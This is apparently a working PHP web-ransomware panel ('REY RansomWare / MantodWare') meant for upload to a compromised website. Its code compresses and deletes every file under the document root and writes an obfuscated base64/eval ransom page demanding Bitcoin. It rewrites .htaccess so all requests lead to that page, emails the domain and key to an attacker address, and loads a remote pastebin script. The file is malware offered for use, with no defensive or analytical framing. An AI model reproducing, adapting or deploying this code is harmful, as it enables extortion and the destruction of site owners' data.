<!DOCTYPE html>
<html>
<link rel="icon" type="image/gif" href="https://i.ibb.co/mhGcf0q/D704T.jpg">
<head>
    <meta name="theme-color" content="#1A1C1F">
   <title>./REY RansomWare</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border:1px solid aqua;
    background-color: transparent;
    color: yellow;
    width: 200px;
    height: 20px;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: yellow;
    background-color: transparent;
    width: 90px;
    color: gold;
}
.submite{
       background-color: black;
    color: cyan;
    border: 1.2px dotten gold;
    width: 100px;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
    <center>
<pre>
<center><h1>
<font color="#56F307">                                                                      
  ______  ___             _____      ___________       __                   
  ___   |/  /_____ _________  /____________  /_ |     / /_____ ____________ 
  __  /|_/ /_  __ `/_  __ \  __/  __ \  __  /__ | /| / /_  __ `/_  ___/  _ \
  _  /  / / / /_/ /_  / / / /_ / /_/ / /_/ / __ |/ |/ / / /_/ /_  /   /  __/
  /_/  /_/  \__,_/ /_/ /_/\__/ \____/\__,_/  ____/|__/  \__,_/ /_/    \___/ 
                                            
                                   MantodWare 
                                         [ ./REY (Indonesian Predator) ]                       
<font color="white">Mail Function :</font><?php if(mail('yangrecodemudahanmati@gmail.com','rey ganteng','rey ganteng')) { echo "<font color='aqua'>ON</font>"; } else { echo "<font color='red'>OFF</font>"; } ?>
</font><br></pre>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
    if (strpos($filename, '.reyware') !== false) {
    return;
    }
    file_put_contents($filename.".reyware", gzdeflate(file_get_contents($filename), 9));
    unlink($filename);
$file = base64_decode("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRpbnB1dCA9ICRfUE9TVFsncGFzcyddOw0KJHBhc3MgPSAia250bCI7DQppZihpc3NldCgkaW5wdXQpKSB7DQppZihtZDUoJGlucHV0KSA9PSAkcGFzcykgew0KZnVuY3Rpb24gZGVjZmlsZSgkZmlsZW5hbWUpew0KCWlmIChzdHJwb3MoJGZpbGVuYW1lLCAnLm1hbnRvZHdhcmUnKSA9PT0gRkFMU0UpIHsNCglyZXR1cm47DQoJfQ0KCSRkZWNyeXB0ZWQgPSBnemluZmxhdGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGVuYW1lKSk7DQoJZmlsZV9wdXRfY29udGVudHMoc3RyX3JlcGxhY2UoJy5tYW50b2R3YXJlJywgJycsICRmaWxlbmFtZSksICRkZWNyeXB0ZWQpOw0KdW5saW5rKCdkam9hdC5waHAnKTsNCgl1bmxpbmsoJGZpbGVuYW1lKTsNCgllY2hvICc8dGl0bGU+TWFudG9kV2FyZSB8IEQ3MDRUIFJhbnNvbVdhcmU8L3RpdGxlPjxib2R5IGJnY29sb3I9IzFBMUMxRj48aSBjbGFzcz0iZmEgZmEtdW5sb2NrIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiA8Zm9udCBjb2xvcj0iI0ZGRUIzQiI+VW5sb2NrPC9mb250PiAoPGZvbnQgY29sb3I9IiM0MENFMDgiPlN1Y2Nlc3M8L2ZvbnQ+KSA8Zm9udCBjb2xvcj0iIzAwRkZGRiI+PT48L2ZvbnQ+IDxmb250IGNvbG9yPSIjMjE5NkYzIj4nLiRmaWxlbmFtZS4nPC9mb250PiA8YnI+JzsNCn0NCg0KZnVuY3Rpb24gZGVjZGlyKCRkaXIpew0KCSRmaWxlcyA9IGFycmF5X2RpZmYoc2NhbmRpcigkZGlyKSwgYXJyYXkoJy4nLCAnLi4nKSk7DQoJCWZvcmVhY2goJGZpbGVzIGFzICRmaWxlKSB7DQoJCQlpZihpc19kaXIoJGRpci4iLyIuJGZpbGUpKXsNCgkJCQlkZWNkaXIoJGRpci4iLyIuJGZpbGUpOw0KCQkJfWVsc2Ugew0KCQkJCWRlY2ZpbGUoJGRpci4iLyIuJGZpbGUpOw0KCQl9DQoJfQ0KfQ0KDQpkZWNkaXIoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSk7DQplY2hvICc8Zm9udCBjb2xvcj0ibGltZSI+PGJyPkRlY3J5cHRlZDxicj4nOw0KdW5saW5rKCRfU0VSVkVSWydQSFBfU0VMRiddKTsNCmVjaG8gJzxmb250IGNvbG9yPSJsaW1lIj5zdWNlc3MgISEhJzsNCn0gZWxzZSB7DQplY2hvICc8dGl0bGU+TWFudG9kV2FyZSB8IEQ3MDRUIFJhbnNvbVdhcmU8L3RpdGxlPg0KPG1ldGEgbmFtZT0idGhlbWUtY29sb3IiIGNvbnRlbnQ9IiNjYzEwMTciPg0KPGJvZHkgYmdjb2xvcj0jMUExQzFGPg0KPHByZT4NCjxjZW50ZXI+PGgxPg0KPGZvbnQgY29sb3I9IiM1NkYzMDciPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgX19fX19fICBfX18gICAgICAgICAgICAgX19fX18gICAgICBfX19fX19fX19fXyAgICAgICBfXyAgICAgICAgICAgICAgICAgICANCiAgX19fICAgfC8gIC9fX19fXyBfX19fX19fX18gIC9fX19fX19fX19fX18gIC9fIHwgICAgIC8gL19fX19fIF9fX19fX19fX19fXyANCiAgX18gIC98Xy8gL18gIF9fIGAvXyAgX18gXCAgX18vICBfXyBcICBfXyAgL19fIHwgL3wgLyAvXyAgX18gYC9fICBfX18vICBfIFwNCiAgXyAgLyAgLyAvIC8gL18vIC9fICAvIC8gLyAvXyAvIC9fLyAvIC9fLyAvIF9fIHwvIHwvIC8gLyAvXy8gL18gIC8gICAvICBfXy8NCiAgL18vICAvXy8gIFxfXyxfLyAvXy8gL18vXF9fLyBcX19fXy9cX18sXy8gIF9fX18vfF9fLyAgXF9fLF8vIC9fLyAgICBcX19fLyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTWFudG9kV2FyZSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsgRDcwNFQgSGFja2VyIFRlYW0gXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCjwvZm9udD48YnI+DQo8aT4NCiAgICAgICAgICAgIDxmb250IGNvbG9yPSJyZWQiIHNpemU9IjIwIj5Xcm9uZyBQYXNzd29yZCAhISE8L2ZvbnQ+PC9pPg0KPC9wcmU+JzsNCn0NCmV4aXQoKTsNCn0NCj8+DQoJPCEtLS0tLS0tLS0tLS0gQ29kZWQgQnkgRDcwNFQgfCBNYW50b2RXYXJlIHwNCiBENzA0VCBIYWNrZXIgVGVhbSAtLS0tLS0tLT4gDQo8aHRtbD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXdpbmRvd3MtMTI1MiI+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyI+DQo8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iRDcwNFQgUmFuc29td2ViIHwgTWFudG9kV2FyZSI+DQo8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iTWFuVG9lZCwgUmFuc29td2FyZSwgUmFuc29td2ViLCBIYWNrZWQsIExvY2tlZCwgRW5jcnlwdGVkLCBENzA0VCI+IA0KPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJNYW50b2QiPg0KPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJpbmRleCwgYWxsIj4NCgk8bGluayBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9SWNlbGFuZCcgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+DQo8bGluayBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9TWVyaWVuZGEnIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPg0KPGxpbmsgaHJlZj0naHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVVidW50dScgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+DQo8bGluayBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9U2hhZG93cytJbnRvK0xpZ2h0JyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz48bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3BuZyIgaHJlZj0iaHR0cHM6Ly9pLmliYi5jby9taEdjZjBxL0Q3MDRULmpwZyIvPjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vZm9udC1hd2Vzb21lLzQuNi4zL2Nzcy9mb250LWF3ZXNvbWUubWluLmNzcyI+DQo8bWV0YSBwcm9wZXJ0eT0ib2c6aW1hZ2UiIGNvbnRlbnQ9Imh0dHBzOi8vaS5pYmIuY28vbWhHY2YwcS9ENzA0VC5qcGciPjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9TYk40VVRRWCI+PC9zY3JpcHQ+PG1ldGEgbmFtZT0ndGhlbWUtY29sb3InIGNvbnRlbnQ9JyMwMDAwMDAnPg0KPGhlYWQ+DQo8dGl0bGU+RDcwNFQgUmFuc29tV2FyZTwvdGl0bGU+PC9oZWFkPg0KPHN0eWxlPg0KYm9keSB7DQpiYWNrZ3JvdW5kOiAjMDkxNDBFOw0KICAgYmFja2dyb3VuZC1pbWFnZTp1cmwoaHR0cHM6Ly9pLmliYi5jby9taEdjZjBxL0Q3MDRULmpwZyk7IGJhY2tncm91bmQtc2l6ZTpjb3Zlcjt9DQp7DQotd2Via2l0LWJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOw0KICAgLW1vei1iYWNrZ3JvdW5kLXNpemU6IDEwMCUgMTAwJTsNCiAgIC1vLWJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOw0KICAgYmFja2dyb3VuZC1zaXplOiAxMDAlIDEwMCU7DQp9DQoubXR7DQogICAgYm9yZGVyOjEuMnB4IHNvbGlkIGFxdWE7DQogICAgYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7DQogICAgY29sb3I6IGxpbWU7DQogICAgd2lkdGg6IDIwMHB4Ow0KICAgIGhlaWdodDogMjVweDsNCiAgICBmb250LWZhbWlseTogVWJ1bnR1Ow0KICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCn0NCi5idGNhZGRyZXNzew0KICAgIGJvcmRlcjowLjhweCBzb2xpZCBncmV5Ow0KICAgIGJhY2tncm91bmQtY29sb3I6ICMxQTFDMUY7DQogICAgY29sb3I6IHllbGxvdzsNCiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogICAgd2lkdGg6IDQwMHB4Ow0KICAgIGhlaWdodDogMjZweDsNCiAgICBmb250LXNpemU6IDE3Ow0KICAgIGZvbnQtZmFtaWx5OiBVYnVudHU7DQp9DQouZW1haWx7DQogICAgYm9yZGVyOjBweDsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7IA0KICAgIGNvbG9yOiBhcXVhOw0KICAgIHdpZHRoOiAzMTBweDsNCiAgICBoZWlnaHQ6IDMwcHg7DQogICAgZm9udC1zaXplOiAyOC41Ow0KICAgIGZvbnQtZmFtaWx5OiBJY2VsYW5kOw0KfQ0KcGxhY2Vob2xkZXJ7DQoJY29sb3I6IHllbGxvdzsNCn0NCi5nYXN7DQoJYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7DQoJY29sb3I6IGdvbGQ7DQoJYm9yZGVyOiAxLjJweCBzb2xpZCBnb2xkOw0KCXdpZHRoOiA3MHB4Ow0KfQ0KPC9zdHlsZT4NCjxjZW50ZXI+PGJyPjxicj48YnI+PGJyPjxmb250Pg0KPHNwYW4gc3R5bGU9ImZvbnQ6IDQwcHggTWVyaWVuZGE7Y29sb3I6d2hpdGU7Ij5Zb3VyIFdlYnNpdGUgSGFzIGJlZW4gRW5jcnlwdA0KPGhyIHdpZHRoPSI5MCUiPjxzcGFuIHN0eWxlPSdmb250OiAxMHB4IGljZWxhbmQ7Y29sb3I6d2hpdGU7dGV4dC1zaGFkb3c6IDBweCAwcHggMXB4Oyc+fCBQYXltZW50IEFkZHJlc3MgfDxicj48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImJ0Y2FkZHJlc3MiIHZhbHVlPSJwYXltZW50eiIgcmVhZG9ubHk+PGJyPg0KPHNwYW4gc3R5bGU9J2ZvbnQ6IDI1cHggaWNlbGFuZDtjb2xvcjpncmV5O3RleHQtc2hhZG93OiAwcHggMHB4IDNweDsnPk1ha2UgYSBwYXltZW50IG9yIEkgZGVzdHJveSB5b3VyIHdlYnNpdGUgYW5kIGl0IHdpbGwgbm90IHJldHVybiB0byBub3JtYWwsIGJ5IG1ha2luZyBhIHBheW1lbnQgSSB3aWxsIGdpdmUgeW91IGEgcGFzc3dvcmQgYW5kIHlvdXIgd2Vic2l0ZSB3aWxsIHJldHVybiB0byBub3JtYWwgOikNCjxicj48YnI+DQoJPHNwYW4gc3R5bGU9J2ZvbnQ6IDlweCBpY2VsYW5kO2NvbG9yOndoaXRlO3RleHQtc2hhZG93OiAwcHggMHB4IDFweDsnPnx+IFBhc3N3b3JkIH58DQo8Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9InBvc3QiPg0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3MiIGNsYXNzPSJtdCIgcGxhY2Vob2xkZXI9IkVudGVyIHlvdXIgZGVjcnlwdGlvbiBrZXkiPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImdhcyIgdmFsdWU9IkRlY3J5cHQiPg0KPC9mb3JtPg0KPGJyPjxicj4NCjxib2R5IGJnY29sb3I9YmxhY2s+PHRkIGFsaWduPWNlbnRlcj4NCjxzcGFuIHN0eWxlPSJmb250OiAxM3B4IHVidW50dTtjb2xvcjpnb2xkOyI+WyBENzA0VCBIYWNrZXIgVGVhbSBdDQo8aHIgd2lkdGg9IjcwJSIgY29sb3I9InJlZCI+DQoJPHNwYW4gc3R5bGU9J2ZvbnQ6IDguNXB4IEljZWxhbmQ7Y29sb3I6YXF1YTt0ZXh0LXNoYWRvdzogMHB4IDBweCAycHg7Jz48OjogQ29udGFjdCBNZSA6Oj4NCjxicj48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImVtYWlsIiB2YWx1ZT0iZGpvYXRtYWlsIiByZWFkb25seT48YnI+DQo8bWFycXVlZSBiZWhhdmlvcj0iYWx0ZXJuYXRlIiBzY3JvbGxhbW91bnQ9IjUwIiB3aWR0aD0iNDUwIj4gPGZvbnQgc2l6ZT0iNCIgY29sb3I9InNpbHZlciI+PGI+X19fX19fX19fX19fX19fX19fX188Zm9udCBzaXplPSI0IiBjb2xvcj0icmVkIj48Yj5fX19fX19fX19fX19fX19fX19fX19fXzxmb250IHNpemU9IjQiIGNvbG9yPSJzaWx2ZXIiPjxiPl9fX19fX19fX19fX19fX19fX19fPC9mb250PjwvbWFycXVlZT48YnI+DQo8L2h0bWw+");
$q = str_replace('kntl', md5($_POST['pass']), $file);
$w = str_replace('djoatmail', $_POST['email'], $q);
$e = str_replace('paymentz', $_POST['btc'], $w);
$r = str_replace('$3', '$'.$_POST['price'], $e);
$dec = $r;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('djoat.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "#ReyWare | Indonesian Predator\n
DirectoryIndex djoat.php\n
ErrorDocument 403 /djoat.php\n
ErrorDocument 404 /djoat.php\n
ErrorDocument 500 /djoat.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#FF0000">Locked</font> (<font color="#40CE08">Success</font>) <font color="#00FFFF">=></font> <font color="#2196F3">'.$filename.'</font> <br>';
}
function encdir($dir){
    $files = array_diff(scandir($dir), array('.', '..'));
        foreach($files as $file) {
            if(is_dir($dir."/".$file)){
                encdir($dir."/".$file);
            } else {
                encfile($dir."/".$file);
                
        }
    }
}
if(isset($_POST['pass'])){
    encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('djoat.php', $_SERVER['DOCUMENT_ROOT'].'/djoat.php');
$memec = $_POST['email'];
$cyna = 'MantodWare | ./REY Ransomware Info';
$ngentot = "Domain : ".$_SERVER['SERVER_NAME'];
$skuy = "Password : ".$_POST['pass'];
$zegarr = "$ngentot \n $skuy";
if(mail($memec,$cyna,$zegarr)) {
echo '<font color="lime"><b>Password Saved, Check your Email</b></font>';
} else {
echo '<font color="red"><b>No Mail</b></font>';
}
exit();
}
?>
    <pre>
<h2><center><font color=gold>Encryption Key [~'-']~</h2></font></pre></center>
<form action="" method="post" style=" text-align: center;">
<font color="aqua">
    <label>Key : </label>
<input type="text" name="pass" class="inpute" placeholder="make a password">
      <select name="method" class="selecte">
         <option value="kontolbapakkau">Encrypt</option>
      </select><pre><br>
<label>Your Email : </label>
<input type="text" name="email" class="inpute">
<label>Your Payment Address : </label>
<input type="text" name="btc" class="inpute">
    <br>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
</div>
</body>
</html>